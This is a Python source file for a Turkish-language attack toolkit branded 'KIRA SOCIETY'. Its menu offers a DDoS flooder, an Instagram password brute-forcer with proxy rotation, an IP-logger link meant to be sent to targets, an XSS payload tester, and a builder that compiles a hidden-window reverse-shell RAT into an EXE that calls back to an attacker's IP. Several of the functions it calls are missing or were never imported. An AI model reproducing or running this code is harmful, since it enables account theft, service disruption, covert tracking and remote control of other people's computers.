import socket
import threading
import requests
import os
import sys
import time
from datetime import datetime
from flask import Flask, request
import pyngrok.ngrok as ngrok
from colorama import Fore, Style, init

init()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    ascii_art = r'''
        .-"      "-.
       /            \
      |,  .-.  .-.  ,|
      | )(_o/  \o_)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
         `--------`
       ~KIRA SOCIETY~
    '''
    print(Fore.MAGENTA + "Instagram: @0xkirasociety" + Style.RESET_ALL) 
    print(Fore.RED + ascii_art + Style.RESET_ALL)

banner()
print("Geçersiz seçim!")

def start_ip_logger():
    banner()
    print("\033[91mIP Logger Tool Hatalı Olabilir\033[0m")
    
    app = Flask(__name__)
    LOG_FILE = "ip_log.txt"

    @app.route('/')
    def log_ip():
        client_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = f"[{current_time}] IP: {client_ip} | User-Agent: {user_agent}\n"
        
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
        
        return '''
        <html>
        <head>
            <title>KIRA SOCIETY</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');
                body {
                    background-color: #121212;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    overflow: hidden;
                }
                .text {
                    font-family: 'Pacifico', cursive;
                    font-size: 3em;
                    color: #ff00ff;
                    text-shadow: 0 0 10px #00ffff;
                    animation: swing 2s infinite alternate ease-in-out;
                }
                @keyframes swing {
                    0% { transform: rotate(-5deg); }
                    100% { transform: rotate(5deg); }
                }
            </style>
        </head>
        <body>
            <div class="text">Naber Kanka 😎</div>
        </body>
        </html>
        '''
    
    domain = input("Domain/URL girin (örn: kiralogger.com): ").strip()
    if not domain:
        domain = "127.0.0.1:5000"
    
    print("\n[1] Localhost (127.0.0.1:5000)")
    print("[2] Ngrok (Public URL)")
    choice = input("Seçim yapın (1/2): ").strip()
    
    if choice == "1":
        print(f"\n[+] IP Logger başlatıldı: http://{domain}")
        app.run(host='0.0.0.0', port=5000)
    elif choice == "2":
        public_url = ngrok.connect(5000, "http")
        print(f"\n[+] IP Logger başlatıldı: {public_url}")
        print(f"[!] Şu linki dağıt: {public_url}")
        app.run(host='0.0.0.0', port=5000)
    else:
        print("Geçersiz seçim!")

def ddos_attack():
    banner()
    print("\033[91mDDoS Toolu İşte Kanki\033[0m")
    target_ip = input("İp Gir: ")
    target_port = int(input("Port Gir: ") or 80)
    packet_count = int(input("Paket Sayısı: ") or 1000)
    thread_count = int(input("Thread Gir : ") or 10)
    attack_running = True
    def attack():
        sent = 0
        while attack_running and sent < packet_count:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
                sent += 1
                print(f"[{datetime.now()}] [+] Gönderilen Paket Sayısı: {sent} Paketlerin Gittiği Yer {target_ip}:{target_port}")
                sock.close()
            except Exception as e:
                print(f"[!] Error: {e}")
            time.sleep(0.01)
    print(f"\nSaldırı {target_ip}:{target_port} Üzerinde Başlatılıyor. ")
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nSaldırı Duruyor...")
        attack_running = False
        for thread in threads:
            thread.join()
    print("Bitti.")
    input("Entere Bas Ve Ana Menüye Dön.") 

def brute_force():
    username = input("Instagram kullanıcı adı: ")
    password_file = input("Şifrelerin bulunduğu dosya (örn: passwords.txt): ")
    proxy_file = input("Proxylerin bulunduğu dosya (örn: proxy.txt): ")
    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Şifre dosyası bulunamadı!")
        sys.exit(1)
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Proxy dosyası bulunamadı!")
        sys.exit(1)
    login_url = "https://www.instagram.com/accounts/login"
    login_data = {
        'username': username,
        'password': '',
        'queryParams': '',
        'optIntoOneTap': 'false'
    }
    for password in passwords:
        current_proxy = None
        if proxies:
            proxy_address = proxies[int(time.time()) % len(proxies)]
            current_proxy = {
                'http': f'http://{proxy_address}',
                'https': f'http://{proxy_address}'
            }
        login_data['password'] = password
        try:
            response = requests.post(
                login_url, 
                data=login_data,
                proxies=current_proxy,
                timeout=10
            )
            if response.status_code == 200 and 'login' not in response.url:
                print(f"[+] Başarılı! Şifre: {password}")
                return
            elif response.status_code == 200:
                print(f"[-] Hatalı şifre: {password}")
        except Exception as e:
            print(f"[!] Hata: {e}")
    print("[-] Tüm şifreler denenmiş, giriş başarısız!")
    input("Entere Basarak Ana Menüye Dön...")

def port_scanner():
    banner()
    print("\033[91mPort Tarayıcı\033[0m")
    target_ip = input("İp Gir: ")
    start_port = int(input("Başlangıç Portu : ") or 1)
    end_port = int(input("Sınır Port: ") or 1024)
    print(f"\nTaranan İp: {target_ip} Başlangıç Portu {start_port} Sınır {end_port}...")
    open_ports = []
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            print(f"[+] Port {port} is open")
            open_ports.append(port)
        sock.close()
    print(f"\nTarama Tamamlandı. Bulunan {len(open_ports)} açık portlar.")
    if open_ports:
        print("Açık Portlar:", ", ".join(map(str, open_ports)))
    input("Entere Basarak Ana Menüye Dön...")

def ip_lookup():
    banner()
    print("\033[91mIP Lookup Tool\033[0m")
    ip = input("İp Adresi Gir ").strip()
    print(f"\nBakılıyor {ip}...")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        if response['status'] == 'success':
            print("\nIP Information:")
            print(f"Country: {response.get('country', 'N/A')}")
            print(f"Region: {response.get('regionName', 'N/A')}")
            print(f"City: {response.get('city', 'N/A')}")
            print(f"ISP: {response.get('isp', 'N/A')}")
            print(f"Organization: {response.get('org', 'N/A')}")
            print(f"AS: {response.get('as', 'N/A')}")
            print(f"Latitude: {response.get('lat', 'N/A')}")
            print(f"Longitude: {response.get('lon', 'N/A')}")
            print(f"Timezone: {response.get('timezone', 'N/A')}")
        else:
            print("İp Yanlış Yada Api İsteği Başarısız.")
    except Exception as e:
        print(f"Error: {e}")
    input("Entere Basarak Ana Menüye Dön...")

def osint_tools():
    banner()
    print("OSINT Araçları:")
    print("[1] Kullanıcı adı sorgula")
    print("[2] Telefon numarası sorgula")
    print("[0] Ana menüye dön")
    choice = input("Seçim: ").strip()

    if choice == '1':
        username_lookup()
    elif choice == '2':
        phone_lookup()
    else:
        return

def xss_scanner():
    banner()
    url = input("Hedef URL girin: ").strip()
    payloads = ['<script>alert(1)</script>', '" onmouseover="alert(1)"', "';alert(1);//"]
    vulnerable = False
    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=5)
            if payload in r.text:
                print(f"[!] Muhtemel XSS açığı bulundu: {test_url}")
                vulnerable = True
        except Exception as e:
            print(f"Hata: {e}")
    if not vulnerable:
        print("XSS açığı bulunamadı.")
    input("Ana menüye dönmek için Enter'a basın.")

def the_harvester():
    banner()
    domain = input("Domain girin (örnek: example.com): ").strip()
    print(f"The Harvester başlatılıyor: {domain}")
    cmd = f"theHarvester -d {domain} -b all"
    try:
        subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Hata: {e}")
    input("Ana menüye dönmek için Enter'a basın.")

def sqlmap_tool():
    banner()
    url = input("Hedef URL girin: ").strip()
    print(f"sqlmap başlatılıyor: {url}")
    cmd = f"sqlmap -u {url} --batch"
    try:
        subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Hata: {e}")
    input("Ana menüye dönmek için Enter'a basın.")

def create_exe_payload(ip, port, exe_name):
    payload_code = f'''
import socket
import subprocess
import threading
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("{ip}", {port}))
    except:
        return
    while True:
        try:
            data = s.recv(1024).decode("utf-8")
            if data.lower() == "exit":
                break
            elif data.startswith("cd "):
                path = data[3:].strip()
                try:
                    os.chdir(path)
                    s.send(f"Changed directory to {{os.getcwd()}}".encode("utf-8"))
                except Exception as e:
                    s.send(str(e).encode("utf-8"))
            else:
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                s.send(stdout_value)
        except Exception as e:
            s.send(str(e).encode("utf-8"))
    s.close()

if __name__ == "__main__":
    connect()
'''
    with open("payload_temp.py", "w") as f:
        f.write(payload_code)
    os.system(f'pyinstaller --onefile --noconsole payload_temp.py')
    dist_path = os.path.join("dist", "payload_temp.exe")
    if os.path.exists(dist_path):
        os.rename(dist_path, exe_name)
        print(f"[+] EXE payload oluşturuldu: {exe_name}")
    else:
        print("[-] EXE oluşturulamadı.")
    os.remove("payload_temp.py")
    if os.path.exists("payload_temp.spec"):
        os.remove("payload_temp.spec")
    if os.path.exists("build"):
        import shutil
        shutil.rmtree("build")
    if os.path.exists("dist"):
        shutil.rmtree("dist")

def create_apk_payload(ip, port, apk_name):
    with open(apk_name, "w") as f:
        f.write(f"Android payload placeholder for IP: {ip}, Port: {port}\nGerçek APK oluşturmak için Android geliştirme ortamı gereklidir.")
    print(f"[!] APK payload placeholder oluşturuldu: {apk_name}")

def rat_payload_creator():
    banner()
    print("Payload tipi seçiniz:")
    print("1 = EXE dosyası oluştur")
    print("2 = APK dosyası oluştur (placeholder)")
    choice = input("Seçiminiz (1/2): ").strip()
    if choice not in ['1', '2']:
        print("Yanlış seçim!")
        time.sleep(1)
        return
    ip = input("Bağlanılacak IP adresi: ").strip()
    port = input("Bağlanılacak port (örnek: 4444): ").strip()
    if not ip or not port.isdigit():
        print("Geçersiz IP veya port!")
        time.sleep(1)
        return
    port = int(port)
    if choice == '1':
        exe_name = input("EXE dosya adı (örnek: payload.exe): ").strip()
        if not exe_name.endswith('.exe'):
            exe_name += '.exe'
        create_exe_payload(ip, port, exe_name)
    else:
        apk_name = input("APK dosya adı (örnek: payload.txt): ").strip()
        if not apk_name:
            apk_name = 'android_payload_placeholder.txt'
        create_apk_payload(ip, port, apk_name)
    input("Entere basarak ana menüye dönün...")

def main():
    while True:
        banner()
        print("  " + Fore.YELLOW + "╔════════════════════════╗" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[1] DDoS Attack        " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[2] Instagram Hack     " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[3] Port Scanner       " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[4] IP Lookup          " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[5] OSINT Tools        " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[6] XSS Scanner        " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[7] The Harvester      " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[8] SQLMap             " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[9] SMS Bomber         " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[10] İp Logger         " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL) 
        print("  " + Fore.YELLOW + "║" + Style.RESET_ALL + " " + Fore.RED + "[0] Exit               " + Style.RESET_ALL + Fore.YELLOW + "║" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "╚════════════════════════╝" + Style.RESET_ALL)

        choice = input("Seçim yapın: ").strip()
        if choice == "1":
            ddos_attack()
        elif choice == "2":
            brute_force()
        elif choice == "3":
            port_scanner()
        elif choice == "4":
            ip_lookup()
        elif choice == "5":
            osint_tools()
        elif choice == "6":
            xss_scanner()
        elif choice == "7":
            the_harvester()
        elif choice == "8":
            sqlmap_tool()
        elif choice == "9":
            sms_bomber() 
        elif choice == "10":
            start_ip_logger() 
        elif choice == "0":
            print("Çıkış yapılıyor...")
            sys.exit()
        else:
            print("Geçersiz seçim!")
            time.sleep(1)

if __name__ == "__main__":
    main()
